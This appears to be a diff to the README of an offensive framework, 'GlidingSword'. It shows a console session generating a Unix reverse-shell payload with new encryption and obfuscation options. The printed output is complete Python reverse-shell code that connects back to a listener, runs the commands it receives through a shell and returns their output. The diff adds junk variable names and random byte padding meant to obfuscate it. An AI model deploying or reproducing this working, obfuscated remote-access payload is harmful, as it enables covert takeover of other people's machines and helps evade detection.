@@ -186,16 +186,20 @@ Option Name        Option Value       Option Description
 -----------        ------------       ------------------ 
 LHOST                                 Your IP.           
 LPORT                                 The port to send the connection to. 
-GlidingSword/Payloads/ShadowShark/UnixPayload> set LHOST 192.168.1.21
+ENCRYPTION                            The encryption used over TCP. 
+OBFUSCATE                             Whether or not to obfuscate the payload. 
+GlidingSword/Payloads/ShadowShark/UnixPayload> set LHOST 192.168.1.15
 GlidingSword/Payloads/ShadowShark/UnixPayload> set LPORT 8080
-GlidingSword/Payloads/ShadowShark/UnixPayload> options
-Option Name        Option Value       Option Description 
------------        ------------       ------------------ 
-LHOST              192.168.1.21       Your IP.           
-LPORT              8080               The port to send the connection to. 
+GlidingSword/Payloads/ShadowShark/UnixPayload> set ENCRYPTION hex
+GlidingSword/Payloads/ShadowShark/UnixPayload> set OBFUSCATE yes
 GlidingSword/Payloads/ShadowShark/UnixPayload> generate
 [+] Successfully generated payload.
 
+b'\x15!:\x99\xe7<\x8fLN/=\x91\xcc\xc2n\xc9f\x82\xb0[\x9cmi\xea\n\xd7\n\xc2\x86\x82\xff\xe1'
+b'\xe4\x10\x18\xe1\x97\xad6{R\xbe\xab\x13\xda\x13\xba&\xfe\xa9\x83\xa8\r3e1\x03\xe3\xcf\xc2\xfa\xba(\x84'
+b'\xe3\xfb\xe2\x1a\x8b\x98\xb1W\xb5\x16\x1c\xacC\xd6\x16Z\x1d%\xe6\x9e4jX\x81\x9f\xfd\xa8\x9c\xcd\x05\xcc\x0e'
+b'\xe04fgK\x03\xd1\xb4\xe9j}\xcf\xf0\xe3d\xa4G\x93\x88y\x97\x9c\xect\xb2\xd18# \xaf\xb7\x1d'
+b'\x8e\x86a\x90\x05A"\x1d\x89\xa6\xcbj\xd2\xa7\xd4\xba\xf5\x1e%L\xac\xcdm\xf5\xe6\x11\x0f\xb8\x04U\xdd\xd4'
 # -*- coding: utf-8 -*-
 """
 A full fledged Shadow Shark payload for Unix.
@@ -217,46 +221,46 @@ NORMAL = '\033[0m'
 def hex_handler(text, encode=False, decode=False):
     '''Encode or decode text using hex.'''
     if encode is True:
-        new_text = text.encode()
-        new_text = codecs.encode(new_text, encoding='hex')
-        new_text = new_text.decode()
-        new_text = json.dumps(new_text)
-        new_text = new_text.encode()
+        OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW = text.encode()
+        OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW = codecs.encode(OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW, encoding='hex')
+        OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW = OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW.decode()
+        OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW = json.dumps(OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW)
+        OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW = OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW.encode()
     if decode is True:
-        new_text = json.loads(text)
-        new_text = new_text.encode()
-        new_text = codecs.decode(new_text, encoding='hex')
-        new_text = new_text.decode()
-    return new_text
+        OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW = json.loads(text)
+        OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW = OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW.encode()
+        OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW = codecs.decode(OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW, encoding='hex')
+        OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW = OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW.decode()
+    return OnbnXyWppOYTFMQrjrQRMgWwVbQVBgBUGJzbewEuRoNLtMTgjLDlRSNSZLoygNyW
 
-rev_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-rev_socket.connect(('192.168.1.21', 8080))
+NLsCMqjeCnZZcXZVTHVmscwmPnYgApYhaYwYGCERSirwKrKokeYYznWWNnxtSBBx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+NLsCMqjeCnZZcXZVTHVmscwmPnYgApYhaYwYGCERSirwKrKokeYYznWWNnxtSBBx.connect(('192.168.1.15', 8080))
 
 while True:
-    command = b''
+    hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX = b''
     while True:
         try:
-            command = command + rev_socket.recv(1024)
-            if not command:
+            hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX = hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX + NLsCMqjeCnZZcXZVTHVmscwmPnYgApYhaYwYGCERSirwKrKokeYYznWWNnxtSBBx.recv(1024)
+            if not hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX:
                 break
-            if command[-1] == 34:
+            if hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX[-1] == 34:
                 break
         except ValueError:
             continue
     try:
-        command = hex_handler(command, decode=True)
+        hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX = hex_handler(hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX, decode=True)
     except json.decoder.JSONDecodeError:
         continue
 
-    if 'sudo' in command or 'su' in command:
-        rev_socket.send(hex_handler('sudo and su are not supported.', encode=True))
+    if 'sudo' in hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX or 'su' in hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX:
+        NLsCMqjeCnZZcXZVTHVmscwmPnYgApYhaYwYGCERSirwKrKokeYYznWWNnxtSBBx.send(hex_handler('sudo and su are not supported.', encode=True))
         continue
 
-    if command == 'exit':
-        rev_socket.close()
+    if hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX == 'exit':
+        NLsCMqjeCnZZcXZVTHVmscwmPnYgApYhaYwYGCERSirwKrKokeYYznWWNnxtSBBx.close()
         break
 
-    if command == 'directory':
+    if hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX == 'directory':
         user = getpass.getuser()
         system = platform.uname().node
         cwd = os.getcwd()
@@ -266,33 +270,38 @@ while True:
             prompt = f'{GREEN}{user}@{system}{NORMAL}:{BLUE}~{user_path}{NORMAL}$'
         else:
             prompt = f'{GREEN}{user}@{system}{NORMAL}:{BLUE}{cwd}{NORMAL}$'
-        rev_socket.send(hex_handler(prompt, encode=True))
+        NLsCMqjeCnZZcXZVTHVmscwmPnYgApYhaYwYGCERSirwKrKokeYYznWWNnxtSBBx.send(hex_handler(prompt, encode=True))
         continue
 
-    output = subprocess.Popen(command, shell=True, stdout=subprocess.P192.168.1.21E, stderr=subprocess.P192.168.1.21E)
+    HdPpIZbyUaVQwAUGwtTgdXlMmgpDLECZsaFbvHTJdPscPPGbqlcKrRuyeOpdtOpK = subprocess.Popen(hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     try:
-        stdout = output.stdout.read().decode()
+        stdout = HdPpIZbyUaVQwAUGwtTgdXlMmgpDLECZsaFbvHTJdPscPPGbqlcKrRuyeOpdtOpK.stdout.read().decode()
     except UnicodeDecodeError:
-        rev_socket.send(hex_handler('Could not send the data.', encode=True))
+        NLsCMqjeCnZZcXZVTHVmscwmPnYgApYhaYwYGCERSirwKrKokeYYznWWNnxtSBBx.send(hex_handler('Could not send the data.', encode=True))
         continue
     if stdout:
-        rev_socket.send(hex_handler(stdout, encode=True))
+        NLsCMqjeCnZZcXZVTHVmscwmPnYgApYhaYwYGCERSirwKrKokeYYznWWNnxtSBBx.send(hex_handler(stdout, encode=True))
         continue
-    stderr = output.stderr.read().decode()
+    stderr = HdPpIZbyUaVQwAUGwtTgdXlMmgpDLECZsaFbvHTJdPscPPGbqlcKrRuyeOpdtOpK.stderr.read().decode()
     if stderr:
-        rev_socket.send(hex_handler(stderr, encode=True))
+        NLsCMqjeCnZZcXZVTHVmscwmPnYgApYhaYwYGCERSirwKrKokeYYznWWNnxtSBBx.send(hex_handler(stderr, encode=True))
         continue
 
-    if command.startswith('cd') and len(command.split()) >= 2:
+    if hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX.startswith('cd') and len(hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX.split()) >= 2:
         try:
-            os.chdir(command[3:])
+            os.chdir(hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX[3:])
         except IOError:
-            rev_socket.send(hex_handler(f'bash: cd: {command[3:]}: No such file or directory', encode=True))
+            NLsCMqjeCnZZcXZVTHVmscwmPnYgApYhaYwYGCERSirwKrKokeYYznWWNnxtSBBx.send(hex_handler(f'bash: cd: {hNxxrJEkrEgaqkigVxTmELhyThPeNUxZgIPwvZapmVnJJyXOswYvQiTHRtHksasX[3:]}: No such file or directory', encode=True))
             continue
 
-    rev_socket.send(hex_handler('\n', encode=True))
+    NLsCMqjeCnZZcXZVTHVmscwmPnYgApYhaYwYGCERSirwKrKokeYYznWWNnxtSBBx.send(hex_handler('\n', encode=True))
+b'"\x87n\x87\t3*Y\x91!E\xde\xda7\xd1\xf4C}X\xef\xa1\x1fC\x03\x94\x00!5VO\xe13'
+b'E\x0f_\xc8\xe7\x9dg\xcb\x7f\xbd\xebk8Y\xfah\xca\x83\xd5\x07\x06u\xa4\xa8r\xcc\xff\x18\x1a\x11\xaay'
+b'q\xe32v\xc2\x8c\x9d\xb1[xy\x92%\xed\xddW \xca\xdd\xb4?\xe4R<S\xda\xb1\xce\xb7\xa3Cu'
+b'\x9e2>\xb1A\xec\x9b\xe4u\xb2\x04QQ\xe4k\xee\xfe\x15\xa0\x03\xd5\xe7\xb6\x93\xdc\xc7\xbc\x07\x90\x97\x17\xfe'
+b"S+'\x07\x03\xba\xf4P\xf5\x94\x91\xbe g\n\xed\x98\xe3\xb1S\xdfh\x91\xbdV\xceO\x13i\x05\xbe\xb1"
 
-GlidingSword/Payloads/ShadowShark/UnixPayload> 
+GlidingSword/Payloads/ShadowShark/UnixPayload>
 ```
 ### General functionality
 To terminate a listener use Ctrl + c. In all other cases use Ctrl + c to return to the main menu. This framework is user friendly and is not case-sensitive.
